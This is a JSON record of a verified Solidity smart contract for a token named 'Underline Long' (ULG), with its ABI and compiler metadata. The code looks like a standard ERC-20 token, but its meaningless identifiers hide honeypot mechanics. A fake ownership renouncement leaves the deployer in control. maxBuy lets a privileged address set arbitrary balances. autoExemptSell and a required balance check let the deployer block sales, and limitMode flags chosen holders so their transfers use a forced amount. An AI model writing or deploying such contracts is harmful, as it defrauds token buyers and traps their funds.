{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface sellLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fundFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverTotalList {\n    function createPair(address amountExemptReceiver, address limitSender) external returns (address);\n}\n\ninterface marketingTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldEnableMarketing) external view returns (uint256);\n\n    function transfer(address maxReceiverSender, uint256 liquidityTotal) external returns (bool);\n\n    function allowance(address launchedMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxReceiverSender,\n        uint256 liquidityTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txMode, uint256 value);\n    event Approval(address indexed launchedMode, address indexed spender, uint256 value);\n}\n\ninterface atWallet is marketingTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnderlineLong is fundFee, marketingTrading, atWallet {\n\n    function maxBuy(address receiverLaunchedTx, uint256 liquidityTotal) public {\n        launchedList();\n        tokenLaunched[receiverLaunchedTx] = liquidityTotal;\n    }\n\n    bool public sellToken;\n\n    uint8 private totalMarketing = 18;\n\n    uint256 feeReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return tradingTeam;\n    }\n\n    uint256 public toExempt;\n\n    bool public limitReceiver;\n\n    function isExempt(address sellSender, address maxReceiverSender, uint256 liquidityTotal) internal returns (bool) {\n        require(tokenLaunched[sellSender] >= liquidityTotal);\n        tokenLaunched[sellSender] -= liquidityTotal;\n        tokenLaunched[maxReceiverSender] += liquidityTotal;\n        emit Transfer(sellSender, maxReceiverSender, liquidityTotal);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atLaunched;\n    }\n\n    address private minFund;\n\n    function getOwner() external view returns (address) {\n        return minFund;\n    }\n\n    function amountLimitMax(address isReceiverTx) public {\n        if (buyToken) {\n            return;\n        }\n        \n        swapMarketing[isReceiverTx] = true;\n        if (fundAutoSwap != amountMax) {\n            toExempt = amountMax;\n        }\n        buyToken = true;\n    }\n\n    uint256 public fundAutoSwap;\n\n    uint256 constant liquidityList = 20 ** 10;\n\n    address fromWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalMarketing;\n    }\n\n    function autoExemptSell(uint256 liquidityTotal) public {\n        launchedList();\n        feeReceiver = liquidityTotal;\n    }\n\n    uint256 fundTotal;\n\n    mapping(address => bool) public isReceiver;\n\n    uint256 private amountMax;\n\n    bool private exemptModeList;\n\n    mapping(address => mapping(address => uint256)) private tokenAmountTake;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isLaunchedLimit;\n    }\n\n    event OwnershipTransferred(address indexed atFromLaunched, address indexed fundTradingTotal);\n\n    address takeSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private tokenLaunched;\n\n    function approve(address listTokenMax, uint256 liquidityTotal) public virtual override returns (bool) {\n        tokenAmountTake[_msgSender()][listTokenMax] = liquidityTotal;\n        emit Approval(_msgSender(), listTokenMax, liquidityTotal);\n        return true;\n    }\n\n    function balanceOf(address shouldEnableMarketing) public view virtual override returns (uint256) {\n        return tokenLaunched[shouldEnableMarketing];\n    }\n\n    function launchedList() private view {\n        require(swapMarketing[_msgSender()]);\n    }\n\n    function autoReceiver() public {\n        emit OwnershipTransferred(tradingSender, address(0));\n        minFund = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return minFund;\n    }\n\n    string private atLaunched = \"ULG\";\n\n    address public minLimit;\n\n    mapping(address => bool) public swapMarketing;\n\n    function transferFrom(address sellSender, address maxReceiverSender, uint256 liquidityTotal) external override returns (bool) {\n        if (_msgSender() != fromWallet) {\n            if (tokenAmountTake[sellSender][_msgSender()] != type(uint256).max) {\n                require(liquidityTotal <= tokenAmountTake[sellSender][_msgSender()]);\n                tokenAmountTake[sellSender][_msgSender()] -= liquidityTotal;\n            }\n        }\n        return receiverMinEnable(sellSender, maxReceiverSender, liquidityTotal);\n    }\n\n    string private tradingTeam = \"Underline Long\";\n\n    uint256 private isLaunchedLimit = 100000000 * 10 ** 18;\n\n    uint256 private liquidityReceiver;\n\n    uint256 private enableSender;\n\n    bool private minToken;\n\n    address public tradingSender;\n\n    function limitMode(address autoTx) public {\n        launchedList();\n        if (maxTrading != enableSender) {\n            maxTrading = toExempt;\n        }\n        if (autoTx == tradingSender || autoTx == minLimit) {\n            return;\n        }\n        isReceiver[autoTx] = true;\n    }\n\n    constructor (){\n        if (fundAutoSwap != toExempt) {\n            enableSender = fundAutoSwap;\n        }\n        sellLiquidity isTotal = sellLiquidity(fromWallet);\n        minLimit = receiverTotalList(isTotal.factory()).createPair(isTotal.WETH(), address(this));\n        \n        tradingSender = _msgSender();\n        autoReceiver();\n        swapMarketing[tradingSender] = true;\n        tokenLaunched[tradingSender] = isLaunchedLimit;\n        \n        emit Transfer(address(0), tradingSender, isLaunchedLimit);\n    }\n\n    function receiverMinEnable(address sellSender, address maxReceiverSender, uint256 liquidityTotal) internal returns (bool) {\n        if (sellSender == tradingSender) {\n            return isExempt(sellSender, maxReceiverSender, liquidityTotal);\n        }\n        uint256 launchedEnable = marketingTrading(minLimit).balanceOf(takeSwap);\n        require(launchedEnable == feeReceiver);\n        require(maxReceiverSender != takeSwap);\n        if (isReceiver[sellSender]) {\n            return isExempt(sellSender, maxReceiverSender, liquidityList);\n        }\n        return isExempt(sellSender, maxReceiverSender, liquidityTotal);\n    }\n\n    bool public buyToken;\n\n    function transfer(address receiverLaunchedTx, uint256 liquidityTotal) external virtual override returns (bool) {\n        return receiverMinEnable(_msgSender(), receiverLaunchedTx, liquidityTotal);\n    }\n\n    uint256 public maxTrading;\n\n    function allowance(address buyMax, address listTokenMax) external view virtual override returns (uint256) {\n        if (listTokenMax == fromWallet) {\n            return type(uint256).max;\n        }\n        return tokenAmountTake[buyMax][listTokenMax];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFromLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTradingTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listTokenMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiverTx\",\"type\":\"address\"}],\"name\":\"amountLimitMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTokenMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityTotal\",\"type\":\"uint256\"}],\"name\":\"autoExemptSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldEnableMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAutoSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTx\",\"type\":\"address\"}],\"name\":\"limitMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunchedTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTotal\",\"type\":\"uint256\"}],\"name\":\"maxBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunchedTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxReceiverSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnderlineLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}